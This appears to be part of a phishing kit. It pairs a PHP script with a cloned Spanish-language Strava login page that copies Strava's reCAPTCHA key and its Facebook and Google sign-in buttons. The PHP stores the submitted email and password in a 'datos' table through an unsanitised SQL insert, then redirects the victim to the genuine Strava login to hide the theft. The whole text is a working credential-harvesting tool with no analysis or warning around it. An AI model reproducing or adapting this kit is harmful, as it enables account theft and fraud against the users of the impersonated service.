...
$mail = $_GET["email"];
  ...
  $insert = "insert into datos values('$mail', '$pass', 'Strava')";
//realizamos consulta para insertar los datos
  $return = mysqli_query( $conn, $insert);
  print_r( ( $return));
 // echo " : Registro correcto";
	header("Location: https://www.strava.com/login");
	exit();
}
mysqli_close( $conn);
?>
...
<script src='https://www.google.com/recaptcha/enterprise.js?render=6Lf84MMaAAAAAMIXuJFcugYTz-KtII9sep3JVroo'></script>
...
<div class='facebook'>
<a class='btn btn-block fb-button' href='https://www.facebook.com/v7.0/dialog/oauth?access_type=offline&amp;client_id=284597785309&amp;redirect_uri=https%3A%2F%2Fwww.strava.com%2Fo_auth%2Ffacebook&amp;response_type=code&amp;scope=email&amp;state=%7B%22context%22%3A%22facebook_web_signin_v2%22%2C%22state%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0ZV9wYXJhbSI6InIyZjBzODJxczY2MmkxZ3FlaDRoazU0c3NqZmxycjh0In0.XEJbUcxNwg1n4f5GT6-NXj0obKFxPIbyvxXeyt2wX3k%22%7D'>
Iniciar sesión con Facebook
</a>
</div>
<div class='google'>
<a class='btn btn-block google-button' href='https://accounts.google.com/o/oauth2/auth?access_type=offline&amp;client_id=541588808765.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Fwww.strava.com%2Fo_auth%2Fgoogle&amp;response_type=code&amp;scope=email+profile&amp;state=%7B%22context%22%3A%22google_web_signin%22%2C%22state%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0ZV9wYXJhbSI6InIyZjBzODJxczY2MmkxZ3FlaDRoazU0c3NqZmxycjh0In0.XEJbUcxNwg1n4f5GT6-NXj0obKFxPIbyvxXeyt2wX3k%22%7D'>
Iniciar sesión con Google
</a>
</div>
<a class='btn btn-block apple-signup-button apple-button' id='apple-signin'>
...
<script>
  ...
  if (!navigator.cookieEnabled) {
    jQuery('h1').after("<div class='error message'>Permitir las cookies del navegador al iniciar sesión.</div>");
  };
  
  jQuery(document).ready(function(){
    jQuery('#login-button').on('click', function(e){
      e.preventDefault();
       var enterpriseCaptchaEnabled = false;
       if (enterpriseCaptchaEnabled) {
        grecaptcha.enterprise.ready(function() {
          grecaptcha.enterprise.execute("6Lf84MMaAAAAAMIXuJFcugYTz-KtII9sep3JVroo", {action: 'LOGIN'}).then(function(token) {
            jQuery(jQuery.find("input[name=recaptcha_enterprise_token]")).val(token)
